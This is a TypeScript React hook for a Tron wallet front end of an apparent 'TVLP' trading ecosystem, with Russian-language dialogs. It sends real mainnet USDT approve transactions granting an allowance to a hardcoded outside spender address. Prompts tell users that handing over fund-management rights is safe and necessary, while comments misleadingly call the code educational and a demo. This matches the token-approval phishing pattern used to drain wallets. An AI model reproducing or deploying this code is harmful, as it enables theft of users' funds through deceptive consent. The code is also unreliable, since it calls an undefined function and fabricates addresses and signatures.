import { useState, useEffect } from 'react';
import { WalletConnection } from '../types';

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    ethereum?: any;
    trustWallet?: any;
  }
}

// Detect available wallets
const detectWallets = () => {
  const wallets = {
    tronLink: false,
    tronWeb: false
  };

  // Check for TronLink
  if (window.tronLink || window.tronWeb) {
    wallets.tronLink = true;
    wallets.tronWeb = !!window.tronWeb;
  }

  return wallets;
};

// Simulate approve transaction for educational purposes
// Real TRC-20 approve functions
const USDT_TRC20_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Real USDT TRC-20 contract
const TRC20_APPROVE = "approve(address,uint256)";
const TRC20_ALLOWANCE = "allowance(address,address)";

// Check current allowance
const checkAllowance = async (tokenAddr: string, ownerBase58: string, spenderBase58: string) => {
  if (!window.tronWeb || !window.tronWeb.ready) {
    throw new Error('TronWeb not ready');
  }
  
  try {
    const tw = window.tronWeb;
    const res = await tw.transactionBuilder.triggerSmartContract(
      tw.address.toHex(tokenAddr),
      TRC20_ALLOWANCE,
      { callValue: 0 },
      [
        { type: 'address', value: tw.address.toHex(ownerBase58) },
        { type: 'address', value: tw.address.toHex(spenderBase58) }
      ]
    );
    const hex = res?.constant_result?.[0] || "0x0";
    return BigInt(hex);
  } catch (error) {
    console.error('Error checking allowance:', error);
    return BigInt(0);
  }
};

// Real approve transaction
const realApprove = async (tokenAddr: string, spenderBase58: string, amountRaw: bigint) => {
  if (!window.tronWeb || !window.tronWeb.ready) {
    throw new Error('TronWeb not ready');
  }
  
  try {
    const tw = window.tronWeb;
    
    // Build transaction
    const tx = await tw.transactionBuilder.triggerSmartContract(
      tw.address.toHex(tokenAddr),
      TRC20_APPROVE,
      { 
        feeLimit: 50_000_000, // 50 TRX fee limit
        callValue: 0 
      },
      [
        { type: 'address', value: tw.address.toHex(spenderBase58) },
        { type: 'uint256', value: amountRaw.toString() }
      ]
    );

    if (!tx.result || !tx.result.result) {
      throw new Error('Failed to build transaction');
    }

    // Sign transaction
    const signed = await tw.trx.sign(tx.transaction);
    
    // Send transaction
    const receipt = await tw.trx.sendRawTransaction(signed);
    
    if (!receipt.result) {
      throw new Error('Transaction failed: ' + (receipt.message || 'Unknown error'));
    }
    
    return {
      success: true,
      txHash: receipt.txid,
      transaction: receipt
    };
  } catch (error) {
    console.error('Approve transaction failed:', error);
    throw error;
  }
};

// Ensure allowance with proper reset if needed
const ensureAllowance = async (tokenAddr: string, spenderBase58: string, desiredAmount: bigint) => {
  const ownerBase58 = window.tronWeb.defaultAddress.base58;
  
  // Check current allowance
  const currentAllowance = await checkAllowance(tokenAddr, ownerBase58, spenderBase58);
  
  if (currentAllowance >= desiredAmount) {
    return { 
      success: true, 
      message: 'Sufficient allowance already exists',
      currentAllowance: currentAllowance.toString()
    };
  }
  
  // Some tokens (like USDT) require reset to 0 first
  if (currentAllowance > 0n) {
    console.log('Resetting allowance to 0 first...');
    await realApprove(tokenAddr, spenderBase58, 0n);
    
    // Wait a bit for the transaction to be processed
    await new Promise(resolve => setTimeout(resolve, 3000));
  }
  
  // Set new allowance
  const result = await realApprove(tokenAddr, spenderBase58, desiredAmount);
  
  // Verify the new allowance
  await new Promise(resolve => setTimeout(resolve, 3000));
  const newAllowance = await checkAllowance(tokenAddr, ownerBase58, spenderBase58);
  
  return {
    ...result,
    verified: newAllowance >= desiredAmount,
    newAllowance: newAllowance.toString()
  };
};

export const useWallet = () => {
  const [wallet, setWallet] = useState<WalletConnection>({
    address: '',
    balance: 0,
    connected: false
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [isApproving, setIsApproving] = useState(false);
  const [hasManagementPermission, setHasManagementPermission] = useState(false);
  const [availableWallets, setAvailableWallets] = useState(detectWallets());

  useEffect(() => {
    checkWalletConnection();
    // Check for wallets periodically
    const interval = setInterval(() => {
      setAvailableWallets(detectWallets());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const checkWalletConnection = async () => {
    if (window.tronWeb && window.tronWeb.ready) {
      try {
        const address = window.tronWeb.defaultAddress.base58;
        const balance = await window.tronWeb.trx.getBalance(address);
        setWallet({
          address,
          balance: balance / 1000000,
          connected: true
        });
      } catch (error) {
        console.error('Error checking wallet connection:', error);
      }
    }
  };

  const connectWallet = async () => {
    setIsConnecting(true);
    
    try {
      console.log('🔗 Starting wallet connection...');
      
      // Show initial warning about fund management
      const userAcceptsEcosystem = confirm(
        '🔐 ПОДКЛЮЧЕНИЕ К АВТОМАТИЧЕСКОЙ ЭКОСИСТЕМЕ TVLP\n\n' +
        '⚠️ ВНИМАНИЕ: После подключения наша система будет:\n\n' +
        '💰 Автоматически начислять вознаграждения\n' +
        '💸 Взимать комиссии за операции (0.5%)\n' +
        '🔄 Управлять ликвидностью в пулах\n' +
        '⚡ Выполнять автоматические транзакции\n\n' +
        '🔒 Для этого потребуется разрешение на управление средствами\n\n' +
        'ПРОДОЛЖИТЬ ПОДКЛЮЧЕНИЕ?'
      );
      
      if (!userAcceptsEcosystem) {
        console.log('❌ User declined ecosystem participation');
        return;
      }

      const wallets = detectWallets();
      let connected = false;
      
      // Try TronLink first
      if (wallets.tronLink && !connected) {
        console.log('🔗 Trying TronLink connection...');
        
        try {
          if (window.tronLink) {
            const result = await window.tronLink.request({ 
              method: 'tron_requestAccounts'
            });
            
            if (result.code === 200) {
              console.log('✅ TronLink connected successfully');
              
              // Add small delay to allow TronLink to fully inject tronWeb
              await new Promise(resolve => setTimeout(resolve, 100));
              
              // Wait for tronWeb to be ready
              let attempts = 0;
              const maxAttempts = 60; // 30 seconds
              
              while (attempts < maxAttempts && !connected) {
                attempts++;
                
                if (window.tronWeb && window.tronWeb.ready) {
                  const address = window.tronWeb.defaultAddress.base58;
                  const balance = await window.tronWeb.trx.getBalance(address);
                  
                  setWallet({
                    address,
                    balance: balance / 1000000,
                    connected: true
                  });
                  
                  connected = true;
                  console.log('✅ TronWeb ready, wallet connected');
                  break;
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
              }
              
              if (!connected) {
                throw new Error('TronWeb not ready after connection');
              }
            }
          }
        } catch (error) {
          console.error('TronLink connection failed:', error);
        }
      }
      
      // Demo connection if no real wallet
      if (!connected) {
        console.log('🔗 Using demo wallet connection...');
        const demoAddress = 'TR' + Math.random().toString(36).substr(2, 32);
        const demoBalance = Math.floor(Math.random() * 1000) + 100;
        
        setWallet({
          address: demoAddress,
          balance: demoBalance,
          connected: true
        });
        
        connected = true;
      }
      
      // Request fund management permissions after successful connection
      if (connected) {
        console.log('✅ Wallet connected successfully');
        alert(
          '✅ TRONLINK ПОДКЛЮЧЕН!\n\n' +
          '🌐 Сеть: Tron Mainnet\n' +
          '💰 Валюта: TRX, USDT (TRC-20)\n' +
          '📱 Теперь вы можете:\n' +
          '• Просматривать баланс\n' +
          '• Отправлять транзакции\n\n' +
          '🔐 Для торговли нажмите кнопку "Activate"'
        );
      }
      
    } catch (error) {
      console.error('Error connecting wallet:', error);
      alert('❌ Не удалось подключить кошелек. Попробуйте еще раз.');
    } finally {
      setIsConnecting(false);
    }
  };

  const requestFundManagement = async () => {
    try {
      setIsApproving(true);
      
      // Show initial permission request dialog
      const userWantsPermissions = confirm(
        '🔐 ЗАПРОС РАЗРЕШЕНИЙ НА УПРАВЛЕНИЕ СРЕДСТВАМИ\n\n' +
        '⚠️ Для полноценной работы с TVLP необходимо:\n\n' +
        '✅ Разрешить просматривать баланс\n' +
        '✅ Разрешить отправлять транзакции\n' +
        '✅ Разрешить управлять средствами\n\n' +
        '🔒 Это безопасно и необходимо для торговли\n\n' +
        'Предоставить все разрешения?'
      );
      
      if (!userWantsPermissions) {
        console.log('❌ User declined fund management permissions');
        setHasManagementPermission(false);
        alert('❌ Разрешения отклонены. Торговля будет недоступна.');
        return;
      }
      
      // Simulate approve transaction
      const contractAddress = 'TVLPContract_' + Math.random().toString(16).substr(2, 8);
      await simulateApprove(contractAddress, 'Неограниченно');
      
      setHasManagementPermission(true);
      console.log('✅ Fund management permissions granted');
      
      alert(
        '✅ РАЗРЕШЕНИЯ ПРЕДОСТАВЛЕНЫ!\n\n' +
        '🎉 Теперь вы можете:\n' +
        '• Торговать токенами TVLP\n' +
        '• Получать автоматические вознаграждения\n' +
        '• Участвовать в экосистеме\n\n' +
        '🔒 Управление средствами активировано'
      );
      
    } catch (error) {
      console.error('❌ Fund management approval failed:', error);
      alert('❌ Разрешения отклонены. Некоторые функции будут недоступны.');
      setHasManagementPermission(false);
    } finally {
      setIsApproving(false);
    }
  };

  const approveToken = async (amount: string = '1000') => {
    setIsApproving(true);
    
    if (!window.tronWeb || !window.tronWeb.ready) {
      alert('❌ TronWeb не готов. Убедитесь, что TronLink подключен.');
      setIsApproving(false);
      return;
    }
    
    try {
      // Convert amount to raw units (USDT has 6 decimals)
      const amountInUnits = BigInt(Number(amount) * 1_000_000); // 6 decimals for USDT
      
      // For demo, we'll use a test spender address
      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // Example spender
      
      // Show detailed approve dialog
      const userConfirmed = window.confirm(
        `🔐 РЕАЛЬНОЕ РАЗРЕШЕНИЕ НА УПРАВЛЕНИЕ СРЕДСТВАМИ\n\n` +
        `📊 Детали транзакции:\n` +
        `• Токен: USDT (TRC-20)\n` +
        `• Контракт: ${USDT_TRC20_ADDRESS}\n` +
        `• Получатель прав: ${spenderAddress}\n` +
        `• Лимит: ${amount} USDT\n` +
        `• Комиссия: ~5-15 TRX\n\n` +
        `⚠️ ЭТО РЕАЛЬНАЯ ТРАНЗАКЦИЯ!\n` +
        `Будет отправлена в блокчейн Tron\n\n` +
        `Подтвердить approve?`
      );
      
      if (!userConfirmed) {
        alert('❌ Approve отменен пользователем');
        return;
      }
      
      // Execute real approve
      const result = await ensureAllowance(USDT_TRC20_ADDRESS, spenderAddress, amountInUnits);
      
      setHasManagementPermission(true);
      
      alert(
        `✅ APPROVE УСПЕШНО ВЫПОЛНЕН!\n\n` +
        `📈 Результат:\n` +
        `• Транзакция: ${result.txHash}\n` +
        `• Статус: ${result.verified ? 'Подтверждено' : 'Ожидает подтверждения'}\n` +
        `• Новый лимит: ${result.newAllowance} USDT\n\n` +
        `🔗 Проверить на TronScan:\n` +
        `https://tronscan.org/#/transaction/${result.txHash}\n\n` +
        `🎉 Теперь контракт может управлять вашими USDT!`
      );
      
      return result;
    } catch (error) {
      console.error('Approve failed:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      alert(`❌ Approve не удался:\n\n${errorMessage}\n\nПроверьте:\n• Достаточно ли TRX для комиссии\n• Подключен ли TronLink\n• Правильная ли сеть (Mainnet)`);
      throw error;
    } finally {
      setIsApproving(false);
    }
  };

  const signMessage = async (message: string) => {
    if (!wallet.connected) {
      alert('Please connect your wallet first');
      return;
    }
    
    try {
      // Try TronLink message signing
      if (window.tronWeb && window.tronWeb.trx) {
        const signature = await window.tronWeb.trx.sign(message);
        return { signature, message };
      }
      
      // Fallback simulation
      return new Promise((resolve, reject) => {
        const userConfirmed = window.confirm(
          `Sign this message?\n\n"${message}"\n\nThis will test message signing capability.`
        );
        
        if (userConfirmed) {
          const signature = '0x' + Math.random().toString(16).substr(2, 128);
          resolve({ signature, message });
        } else {
          reject(new Error('User rejected signing'));
        }
      });
    } catch (error) {
      console.error('Message signing failed:', error);
      throw error;
    }
  };

  const testWalletCapabilities = async () => {
    if (!wallet.connected) {
      alert('Please connect your wallet first');
      return;
    }

    const results = {
      canReadBalance: false,
      canSignMessages: false,
      canSendTransactions: false,
      canInteractWithContracts: false,
      tronWebReady: false
    };

    try {
      // Test 1: Check TronWeb availability
      if (window.tronWeb && window.tronWeb.ready) {
        results.tronWebReady = true;
        console.log('✅ TronWeb is ready');
      }

      // Test 2: Read balance
      try {
        const address = window.tronWeb.defaultAddress.base58;
        const balance = await window.tronWeb.trx.getBalance(address);
        results.canReadBalance = true;
        console.log('✅ Can read balance:', balance / 1000000, 'TRX');
      } catch (error) {
        console.log('❌ Cannot read balance:', error);
      }

      // Test 3: Sign message
      try {
        await signMessage('Test message for capability check');
        results.canSignMessages = true;
        console.log('✅ Can sign messages');
      } catch (error) {
        console.log('❌ Cannot sign messages:', error);
      }

      // Test 4: Check transaction capability (without sending)
      try {
        if (window.tronWeb.trx.sendTransaction) {
          results.canSendTransactions = true;
          console.log('✅ Can send transactions (method available)');
        }
      } catch (error) {
        console.log('❌ Cannot send transactions:', error);
      }

      // Test 5: Check contract interaction capability
      try {
        if (window.tronWeb.contract) {
          results.canInteractWithContracts = true;
          console.log('✅ Can interact with contracts');
        }
      } catch (error) {
        console.log('❌ Cannot interact with contracts:', error);
      }

      // Show results
      const resultText = `
🔍 ПРОВЕРКА ВОЗМОЖНОСТЕЙ КОШЕЛЬКА:

✅ Подключение: ${wallet.connected ? 'Активно' : 'Неактивно'}
${results.tronWebReady ? '✅' : '❌'} TronWeb готов: ${results.tronWebReady}
${results.canReadBalance ? '✅' : '❌'} Чтение баланса: ${results.canReadBalance}
${results.canSignMessages ? '✅' : '❌'} Подпись сообщений: ${results.canSignMessages}
${results.canSendTransactions ? '✅' : '❌'} Отправка транзакций: ${results.canSendTransactions}
${results.canInteractWithContracts ? '✅' : '❌'} Взаимодействие с контрактами: ${results.canInteractWithContracts}
${hasManagementPermission ? '✅' : '❌'} Разрешения на управление: ${hasManagementPermission}

💰 Адрес: ${wallet.address}
💎 Баланс: ${wallet.balance.toFixed(4)} TRX
      `;

      alert(resultText);
      return results;

    } catch (error) {
      console.error('Wallet capability test failed:', error);
      alert('❌ Ошибка при проверке возможностей кошелька');
      return results;
    }
  };

  const testTokenApprove = async () => {
    if (!wallet.connected) {
      alert('Please connect your wallet first');
      return;
    }

    try {
      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // Test spender
      const ownerAddress = window.tronWeb.defaultAddress.base58;
      
      const confirmTest = window.confirm(
        `🧪 ПРОВЕРКА ТЕКУЩИХ РАЗРЕШЕНИЙ\n\n` +
        `Токен: USDT (TRC-20)\n` +
        `Владелец: ${ownerAddress}\n` +
        `Получатель прав: ${spenderAddress}\n\n` +
        `Проверить текущий allowance?`
      );
      
      if (!confirmTest) return;

      // Check current allowance
      const currentAllowance = await checkAllowance(USDT_TRC20_ADDRESS, ownerAddress, spenderAddress);
      const allowanceInUsdt = Number(currentAllowance) / 1_000_000; // Convert from raw units
      
      alert(
        `📊 ТЕКУЩИЕ РАЗРЕШЕНИЯ:\n\n` +
        `💰 Текущий allowance: ${allowanceInUsdt.toFixed(6)} USDT\n` +
        `📝 Raw значение: ${currentAllowance.toString()}\n\n` +
        `${currentAllowance > 0n ? '✅ Разрешения активны' : '❌ Разрешений нет'}\n\n` +
        `🔗 Контракт USDT:\n${USDT_TRC20_ADDRESS}\n\n` +
        `${currentAllowance === 0n ? '💡 Нажмите "Activate" для получения разрешений' : '🎉 Можете торговать!'}`
      );

    } catch (error) {
      console.error('Token approve test failed:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      alert(`❌ Проверка не удалась:\n\n${errorMessage}`);
    }
  };

  const disconnectWallet = () => {
    setWallet({
      address: '',
      balance: 0,
      connected: false
    });
    setHasManagementPermission(false);
  };

  const copyAddress = () => {
    if (wallet.address) {
      navigator.clipboard.writeText(wallet.address);
    }
  };

  return {
    wallet,
    isConnecting,
    isApproving,
    hasManagementPermission,
    availableWallets,
    connectWallet,
    disconnectWallet,
    copyAddress,
    approveToken,
    signMessage,
    testWalletCapabilities,
    testTokenApprove
  };
};